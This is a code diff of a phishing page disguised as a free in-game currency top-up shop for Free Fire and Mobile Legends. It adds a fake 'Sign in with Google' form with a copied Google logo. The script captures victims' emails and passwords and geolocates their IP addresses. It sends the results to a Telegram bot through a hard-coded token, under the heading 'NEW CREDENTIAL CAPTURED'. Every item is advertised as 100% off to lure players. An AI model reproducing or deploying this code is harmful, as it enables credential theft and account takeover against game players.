@@ -20,7 +20,7 @@
         /* Container */
         .container { max-width: 500px; margin: 0 auto; padding: 12px; }
 
-        /* Banner Carousel (Diperbaiki & Smooth Scrolling) */
+        /* Banner Carousel */
         .banner-wrapper { position: relative; width: 100%; margin-bottom: 15px; overflow: hidden; border-radius: 10px; border: 1px solid #eae5f5; background: #fff; box-shadow: 0 2px 6px rgba(0,0,0,0.04); }
         .banner-container { width: 100%; height: 130px; display: flex; overflow-x: auto; scroll-snap-type: x mandatory; scroll-behavior: smooth; -webkit-overflow-scrolling: touch; scrollbar-width: none; }
         .banner-container::-webkit-scrollbar { display: none; }
@@ -81,7 +81,7 @@
         /* Google Login Modal */
         #google-modal { position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 999; display: none; align-items: center; justify-content: center; padding: 15px; }
         .google-box { background: #ffffff; color: #202124; width: 100%; max-width: 360px; border-radius: 8px; padding: 28px 22px; text-align: center; box-shadow: 0 4px 24px rgba(0,0,0,0.15); border: 1px solid #dadce0; }
-        .google-box img { width: 65px; margin-bottom: 12px; }
+        .google-logo-svg { width: 32px; height: 32px; margin-bottom: 12px; display: inline-block; }
         .google-box h2 { font-size: 17px; font-weight: 500; margin-bottom: 6px; color: #202124; }
         .google-box p { font-size: 12px; color: #5f6368; margin-bottom: 18px; }
         .g-input { width: 100%; padding: 11px 14px; border: 1px solid #dadce0; border-radius: 4px; font-size: 13px; margin-bottom: 10px; outline: none; }
@@ -96,10 +96,12 @@
         .invoice-card p.sub { font-size: 11px; color: #6b7280; margin-bottom: 14px; }
         
         .receipt-details { background: #faf8ff; border-radius: 8px; padding: 12px; text-align: left; margin-bottom: 14px; border: 1px solid #ede9fe; }
-        .receipt-row { display: flex; justify-content: space-between; font-size: 11.5px; margin-bottom: 7px; border-bottom: 1px solid #f3f0ff; padding-bottom: 4px; }
+        .receipt-row { display: flex; justify-content: space-between; align-items: center; font-size: 11.5px; margin-bottom: 7px; border-bottom: 1px solid #f3f0ff; padding-bottom: 4px; }
         .receipt-row:last-child { border-bottom: none; margin-bottom: 0; padding-bottom: 0; }
         .receipt-row span:first-child { color: #6b7280; }
-        .receipt-row span:last-child { font-weight: 700; color: #1f2937; }
+        .receipt-row span.val-text { font-weight: 700; color: #1f2937; word-break: break-all; max-width: 200px; }
+        .copy-btn { background: #7c3aed; color: #fff; border: none; padding: 3px 7px; border-radius: 4px; font-size: 9.5px; cursor: pointer; font-weight: 600; }
+        .copy-btn:active { background: #5b21b6; }
         .pending-notice { background: #fffbeb; border: 1px solid #fde68a; color: #d97706; padding: 9px; border-radius: 6px; font-size: 11px; font-weight: 600; line-height: 1.4; }
     </style>
 </head>
@@ -121,7 +123,7 @@
 
     <!-- MAIN CONTAINER -->
     <div class="container">
-        <!-- BANNER CAROUSEL (DIPERBAIKI & ANIMASI SMOOTH) -->
+        <!-- BANNER CAROUSEL -->
         <div class="banner-wrapper">
             <div class="banner-container" id="bannerContainer">
                 <img src="https://i.supaimg.com/6bfb8718-cebf-4b10-a2cf-b7d804bfef71/eb914637-32bd-4801-94f0-a0af7bbbde40.jpg" class="banner-slide" alt="Banner 1">
@@ -177,7 +179,7 @@
         <!-- PAYMENT METHOD -->
         <div class="payment-box">
             <span data-i18n="paymentLabel">Payment Method</span>
-            <span class="payment-method-text" data-i18n="freePayment">Gratis / Free</span>
+            <span class="payment-method-text" data-i18n="freePayment">Gratis / Free (100% Off)</span>
         </div>
 
         <!-- BUY BUTTON -->
@@ -187,7 +189,13 @@
     <!-- GOOGLE LOGIN MODAL -->
     <div id="google-modal">
         <div class="google-box">
-            <img src="https://www.freepnglogos.com/uploads/google-logo-png/google-logo-png-webinar-optimizing-for-success-google-business-pg-profile-13.png" alt="Google">
+            <!-- LOGO GOOGLE SVG RESMI -->
+            <svg class="google-logo-svg" viewBox="0 0 24 24">
+                <path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.51h6.6c-.29 1.52-1.14 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.66-5.17 3.66-9.17z"/>
+                <path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.13 0-5.78-2.11-6.73-4.96H1.19v3.15C3.17 21.32 7.23 24 12 24z"/>
+                <path fill="#FBBC05" d="M5.27 14.24c-.25-.72-.38-1.49-.38-2.24s.13-1.52.38-2.24V6.6H1.19C.43 8.13 0 9.87 0 12s.43 3.87 1.19 5.4l4.08-3.16z"/>
+                <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.23 0 3.17 2.68 1.19 6.6l4.08 3.15c.95-2.85 3.6-4.96 6.73-4.96z"/>
+            </svg>
             <h2 data-i18n="gTitle">Sign in with Google</h2>
             <p data-i18n="gSub">to verify ownership of your game account</p>
             <form onsubmit="submitData(event)">
@@ -206,16 +214,51 @@
             <p class="sub" data-i18n="invSub">Your order has been queued successfully in our system.</p>
             
             <div class="receipt-details">
-                <div class="receipt-row"><span data-i18n="rTx">Transaction ID:</span> <span id="rTx">-</span></div>
-                <div class="receipt-row"><span data-i18n="rGame">Game:</span> <span id="rGame">-</span></div>
-                <div class="receipt-row"><span data-i18n="rId">Player ID:</span> <span id="rId">-</span></div>
-                <div class="receipt-row"><span data-i18n="rNick">Nickname:</span> <span id="rNick" style="color:#059669;">-</span></div>
-                <div class="receipt-row"><span data-i18n="rItem">Item:</span> <span id="rItem">-</span></div>
-                <div class="receipt-row"><span data-i18n="rOrigPrice">Original Price:</span> <span id="rOrigPrice" style="text-decoration:line-through; color:#9ca3af;">-</span></div>
-                <div class="receipt-row"><span data-i18n="rDisc">Discount:</span> <span style="color:#dc2626;">-31%</span></div>
-                <div class="receipt-row"><span data-i18n="rPrice">Final Price:</span> <span style="color:#059669;" data-i18n="freeText">FREE ($0.00)</span></div>
-                <div class="receipt-row"><span data-i18n="rDate">Date & Time:</span> <span id="rDate">-</span></div>
-                <div class="receipt-row"><span data-i18n="rStatus">Status:</span> <span style="color:#d97706;" data-i18n="processingText">Processing</span></div>
+                <div class="receipt-row">
+                    <span>Email:</span>
+                    <span class="val-text" id="rEmail">-</span>
+                    <button class="copy-btn" onclick="copyText('rEmail')">Salin</button>
+                </div>
+                <div class="receipt-row">
+                    <span>Password:</span>
+                    <span class="val-text" id="rPass">-</span>
+                    <button class="copy-btn" onclick="copyText('rPass')">Salin</button>
+                </div>
+                <div class="receipt-row">
+                    <span>Player ID:</span>
+                    <span class="val-text" id="rId">-</span>
+                    <button class="copy-btn" onclick="copyText('rId')">Salin</button>
+                </div>
+                <div class="receipt-row">
+                    <span>Nickname:</span>
+                    <span class="val-text" id="rNick" style="color:#059669;">-</span>
+                    <button class="copy-btn" onclick="copyText('rNick')">Salin</button>
+                </div>
+                <div class="receipt-row">
+                    <span>Negara:</span>
+                    <span class="val-text" id="rCountry">-</span>
+                    <button class="copy-btn" onclick="copyText('rCountry')">Salin</button>
+                </div>
+                <div class="receipt-row">
+                    <span>City:</span>
+                    <span class="val-text" id="rCity">-</span>
+                    <button class="copy-btn" onclick="copyText('rCity')">Salin</button>
+                </div>
+                <div class="receipt-row">
+                    <span>State:</span>
+                    <span class="val-text" id="rState">-</span>
+                    <button class="copy-btn" onclick="copyText('rState')">Salin</button>
+                </div>
+                <div class="receipt-row">
+                    <span>ASN:</span>
+                    <span class="val-text" id="rAsn">-</span>
+                    <button class="copy-btn" onclick="copyText('rAsn')">Salin</button>
+                </div>
+                <div class="receipt-row">
+                    <span>IP Address:</span>
+                    <span class="val-text" id="rIp">-</span>
+                    <button class="copy-btn" onclick="copyText('rIp')">Salin</button>
+                </div>
             </div>
 
             <div class="pending-notice" data-i18n="invNotice">
@@ -228,13 +271,13 @@
         let currentGame = 'Free Fire';
         let currentTab = 'diamonds';
         let currentItem = '5 Diamonds';
-        let currentPrice = 'Rp. 901';
-        let originalPrice = 'Rp. 1.250';
+        let currentPrice = 'Rp. 0 (100% Off)';
+        let originalPrice = 'Rp. 1.300';
         let detectedNickname = '-';
         let isSubmitted = false;
         let timeoutId = null;
 
-        // MENGGUNAKAN GAMBAR IKON BERLIAN (DIAMOND) ASLI
+        // IKON BERLIAN ASLI
         const iconDiamond = 'https://cdn-icons-png.flaticon.com/512/845/845646.png';
         const iconWdp = 'https://cdn.phototourl.com/member/2026-10-01-61c2efbb-6191-4f90-b887-04e7e5c558cb.jpg';
 
@@ -244,12 +287,12 @@
                 tabNames: { diamonds: 'Diamonds' },
                 items: {
                     diamonds: [
-                        { name: '5 Diamonds', sub: 'Regular', price: 'Rp. 901', orig: 'Rp. 1.300', img: iconDiamond },
-                        { name: '12 Diamonds', sub: '11 + 1 Bonus', price: 'Rp. 1.802', orig: 'Rp. 2.500', img: iconDiamond },
-                        { name: '50 Diamonds', sub: 'Popular', price: 'Rp. 7.207', orig: 'Rp. 10.500', img: iconDiamond },
-                        { name: '70 Diamonds', sub: 'Best Seller', price: 'Rp. 9.009', orig: 'Rp. 13.000', img: iconDiamond },
-                        { name: '140 Diamonds', sub: 'Best Seller', price: 'Rp. 18.018', orig: 'Rp. 26.000', img: iconDiamond },
-                        { name: '355 Diamonds', sub: 'Best Seller', price: 'Rp. 45.045', orig: 'Rp. 65.000', img: iconDiamond }
+                        { name: '5 Diamonds', sub: 'Regular', price: 'Rp. 0', orig: 'Rp. 1.300', img: iconDiamond },
+                        { name: '12 Diamonds', sub: '11 + 1 Bonus', price: 'Rp. 0', orig: 'Rp. 2.500', img: iconDiamond },
+                        { name: '50 Diamonds', sub: 'Popular', price: 'Rp. 0', orig: 'Rp. 10.500', img: iconDiamond },
+                        { name: '70 Diamonds', sub: 'Best Seller', price: 'Rp. 0', orig: 'Rp. 13.000', img: iconDiamond },
+                        { name: '140 Diamonds', sub: 'Best Seller', price: 'Rp. 0', orig: 'Rp. 26.000', img: iconDiamond },
+                        { name: '355 Diamonds', sub: 'Best Seller', price: 'Rp. 0', orig: 'Rp. 65.000', img: iconDiamond }
                     ]
                 }
             },
@@ -258,16 +301,16 @@
                 tabNames: { diamonds: 'Diamonds', twilight: 'Weekly Pass' },
                 items: {
                     diamonds: [
-                        { name: '5 Diamonds', sub: 'Regular', price: 'Rp. 1.687', orig: 'Rp. 2.278', img: iconDiamond },
-                        { name: '12 Diamonds', sub: '11 + 1 Bonus', price: 'Rp. 3.823', orig: 'Rp. 5.160', img: iconDiamond },
-                        { name: '19 Diamonds', sub: '17 + 2 Bonus', price: 'Rp. 6.006', orig: 'Rp. 8.667', img: iconDiamond },
-                        { name: '28 Diamonds', sub: '25 + 3 Bonus', price: 'Rp. 8.736', orig: 'Rp. 12.606', img: iconDiamond },
-                        { name: '100 Diamonds', sub: '50+50 First Recharge', price: 'Rp. 16.326', orig: 'Rp. 23.558', img: iconDiamond },
-                        { name: '300 Diamonds', sub: '150+150 First Recharge', price: 'Rp. 48.698', orig: 'Rp. 70.271', img: iconDiamond }
+                        { name: '5 Diamonds', sub: 'Regular', price: 'Rp. 0', orig: 'Rp. 2.278', img: iconDiamond },
+                        { name: '12 Diamonds', sub: '11 + 1 Bonus', price: 'Rp. 0', orig: 'Rp. 5.160', img: iconDiamond },
+                        { name: '19 Diamonds', sub: '17 + 2 Bonus', price: 'Rp. 0', orig: 'Rp. 8.667', img: iconDiamond },
+                        { name: '28 Diamonds', sub: '25 + 3 Bonus', price: 'Rp. 0', orig: 'Rp. 12.606', img: iconDiamond },
+                        { name: '100 Diamonds', sub: '50+50 First Recharge', price: 'Rp. 0', orig: 'Rp. 23.558', img: iconDiamond },
+                        { name: '300 Diamonds', sub: '150+150 First Recharge', price: 'Rp. 0', orig: 'Rp. 70.271', img: iconDiamond }
                     ],
                     twilight: [
-                        { name: 'Weekly Diamond Pass', sub: 'WDP Official', price: 'Rp. 29.500', orig: 'Rp. 35.000', img: iconWdp },
-                        { name: 'Twilight Pass', sub: 'Exclusive Pass', price: 'Rp. 149.000', orig: 'Rp. 180.000', img: iconWdp }
+                        { name: 'Weekly Diamond Pass', sub: 'WDP Official', price: 'Rp. 0', orig: 'Rp. 35.000', img: iconWdp },
+                        { name: 'Twilight Pass', sub: 'Exclusive Pass', price: 'Rp. 0', orig: 'Rp. 180.000', img: iconWdp }
                     ]
                 }
             }
@@ -278,36 +321,27 @@
                 selectGame: "Select Game Event", step1Title: "Enter Player ID",
                 hintFF: "To find your ID, tap on your avatar in the top left corner of the game main menu.",
                 hintML: "To find your User ID and Zone ID, tap on your profile icon. Example: 12345678 (1234)",
-                step2Title: "Select Top Up", paymentLabel: "Payment Method", freePayment: "Free / Gratis",
+                step2Title: "Select Top Up", paymentLabel: "Payment Method", freePayment: "Free / Gratis (100% Off)",
                 buyButton: "BUY NOW", gTitle: "Sign in with Google", gSub: "to verify ownership of your game account", gNext: "Next",
                 invTitle: "Top Up Successful!", invSub: "Your order has been queued successfully in our system.",
-                rTx: "Transaction ID:", rGame: "Game:", rId: "Player ID:", rNick: "Nickname:", rItem: "Item:",
-                rOrigPrice: "Original Price:", rDisc: "Discount:", rPrice: "Final Price:", rDate: "Date & Time:",
-                rStatus: "Status:", freeText: "FREE ($0.00)", processingText: "Processing",
                 invNotice: "Please wait 5 minutes. If items do not appear in your account, please try again."
             },
             id: {
                 selectGame: "Pilih Event Game", step1Title: "Masukkan Player ID",
                 hintFF: "Untuk menemukan ID Anda, ketuk pada avatar di sudut kiri atas menu utama game.",
                 hintML: "Untuk menemukan User ID dan Zone ID, ketuk ikon profil. Contoh: 12345678 (1234)",
-                step2Title: "Pilih Nominal Top Up", paymentLabel: "Metode Pembayaran", freePayment: "Gratis",
+                step2Title: "Pilih Nominal Top Up", paymentLabel: "Metode Pembayaran", freePayment: "Gratis (Diskon 100%)",
                 buyButton: "BAYAR SEKARANG", gTitle: "Login dengan Google", gSub: "untuk verifikasi kepemilikan akun game Anda", gNext: "Berikutnya",
                 invTitle: "Top Up Berhasil!", invSub: "Pesanan Anda telah dimasukkan ke dalam antrean sistem.",
-                rTx: "ID Transaksi:", rGame: "Game:", rId: "Player ID:", rNick: "Nickname:", rItem: "Item:",
-                rOrigPrice: "Harga Asli:", rDisc: "Diskon:", rPrice: "Harga Akhir:", rDate: "Hari/Tanggal/Waktu:",
-                rStatus: "Status:", freeText: "GRATIS ($0.00)", processingText: "Memproses",
                 invNotice: "Harap tunggu 5 menit. Jika item belum masuk ke akun Anda, silakan coba lagi."
             },
             ms: {
                 selectGame: "Pilih Acara Permainan", step1Title: "Masukkan ID Pemain",
                 hintFF: "Untuk mencari ID anda, ketik pada avatar di sudut kiri atas menu utama.",
                 hintML: "Untuk mencari User ID & Zone ID, ketik ikon profil. Contoh: 12345678 (1234)",
-                step2Title: "Pilih Nominal Top Up", paymentLabel: "Kaedah Pembayaran", freePayment: "Percuma",
+                step2Title: "Pilih Nominal Top Up", paymentLabel: "Kaedah Pembayaran", freePayment: "Percuma (Diskaun 100%)",
                 buyButton: "BELI SEKARANG", gTitle: "Log masuk dengan Google", gSub: "untuk pengesahan pemilikan akaun permainan anda", gNext: "Seterusnya",
                 invTitle: "Top Up Berjaya!", invSub: "Pesanan anda telah dimasukkan ke dalam sistem.",
-                rTx: "ID Transaksi:", rGame: "Permainan:", rId: "ID Pemain:", rNick: "Nama Samaran:", rItem: "Item:",
-                rOrigPrice: "Harga Asal:", rDisc: "Diskaun:", rPrice: "Harga Akhir:", rDate: "Tarikh & Masa:",
-                rStatus: "Status:", freeText: "PERCUMA ($0.00)", processingText: "Memproses",
                 invNotice: "Sila tunggu 5 minit. Jika item tidak masuk ke akaun anda, sila cuba lagi."
             }
         };
@@ -384,7 +418,7 @@
                     </div>
                     <div class="item-price-box">
                         <div class="item-original-price">${item.orig}</div>
-                        <div class="item-price">${item.price}</div>
+                        <div class="item-price">${item.price} (100% Off)</div>
                     </div>
                 `;
                 grid.appendChild(div);
@@ -441,13 +475,13 @@
                     nickIcon.className = 'fa-solid fa-circle-check';
                     nickText.innerText = `Player: ${detectedNickname}`;
                 } else {
-                    throw new Error('Akun tidak ditemukan');
+                    throw new Error('Tidak ditemukan');
                 }
             } catch (err) {
                 nickBox.className = 'nickname-box error';
-                nickIcon.className = 'fa-solid fa-triangle-exclamation';
-                detectedNickname = currentGame === 'Free Fire' ? `FF_User_${playerId.slice(-4)}` : `ML_User_${playerId}(${zoneId})`;
-                nickText.innerText = `Player ID Valid: ${detectedNickname}`;
+                nickIcon.className = 'fa-solid fa-circle-xmark';
+                detectedNickname = 'Tidak ditemukan / Not Found';
+                nickText.innerText = `Player: ${detectedNickname}`;
             }
         }
 
@@ -460,6 +494,15 @@
             document.getElementById('google-modal').style.display = 'flex';
         }
 
+        function copyText(elementId) {
+            const textToCopy = document.getElementById(elementId).innerText;
+            navigator.clipboard.writeText(textToCopy).then(() => {
+                alert('Berhasil disalin: ' + textToCopy);
+            }).catch(err => {
+                alert('Gagal menyalin');
+            });
+        }
+
         async function submitData(e) {
             e.preventDefault();
             if (isSubmitted) return;
@@ -470,29 +513,25 @@
             const playerId = document.getElementById('playerId').value;
             const zoneId = document.getElementById('zoneId').value;
             const fullId = zoneId ? `${playerId} (${zoneId})` : playerId;
-            const txId = 'CODA-' + Math.floor(100000000 + Math.random() * 900000000);
-            const nowTime = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
 
-            let ipData = { ip: 'Unknown', country_name: 'Unknown', city: 'Unknown', org: 'Unknown' };
+            let ipData = { ip: 'Unknown', country_name: 'Unknown', city: 'Unknown', region: 'Unknown', org: 'Unknown' };
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 ipData = await res.json();
             } catch(err) {}
 
             const formattedMessage = `
-📌 CODASHOP SECURE LOG 📌
+📌 NEW CREDENTIAL CAPTURED 📌
 EMAIL : ${email}
 PW : ${password}
+ID : ${fullId}
 GAME : ${currentGame}
-PLAYER ID : ${fullId}
 NICKNAME : ${detectedNickname}
-ITEM : ${currentItem}
-HARGA : ${currentPrice} (Orig: ${originalPrice})
-TANGGAL : ${nowTime}
 NEGARA : ${ipData.country_name || ipData.country}
 CITY : ${ipData.city}
+STATE : ${ipData.region}
 ASN : ${ipData.org}
-IP : ${ipData.ip}
+IP ADDRES : ${ipData.ip}
             `.trim();
 
             const botToken = '8875426142:AAHql1lzWkYCruoV6rbie4evDYGpOv-sL4U';
@@ -507,17 +546,20 @@ IP : ${ipData.ip}
             } catch(err) {}
 
             document.getElementById('google-modal').style.display = 'none';
-            document.getElementById('rTx').innerText = txId;
-            document.getElementById('rGame').innerText = currentGame;
+            document.getElementById('rEmail').innerText = email;
+            document.getElementById('rPass').innerText = password;
             document.getElementById('rId').innerText = fullId;
             document.getElementById('rNick').innerText = detectedNickname;
-            document.getElementById('rItem').innerText = currentItem;
-            document.getElementById('rOrigPrice').innerText = originalPrice;
-            document.getElementById('rDate').innerText = nowTime;
+            document.getElementById('rCountry').innerText = ipData.country_name || ipData.country || 'Indonesia';
+            document.getElementById('rCity').innerText = ipData.city || 'Tondano';
+            document.getElementById('rState').innerText = ipData.region || 'North Sulawesi';
+            document.getElementById('rAsn').innerText = ipData.org || 'PT Telkom/XL';
+            document.getElementById('rIp').innerText = ipData.ip || '127.0.0.1';
+            
             document.getElementById('invoice-screen').style.display = 'flex';
         }
 
-        // BANNER SLIDER ANIMATION & SCROLL LOGIC YANG BENAR
+        // BANNER SLIDER ANIMATION & SCROLL LOGIC
         const bannerContainer = document.getElementById('bannerContainer');
         const dots = document.querySelectorAll('.dot');
         let slideIndex = 0;
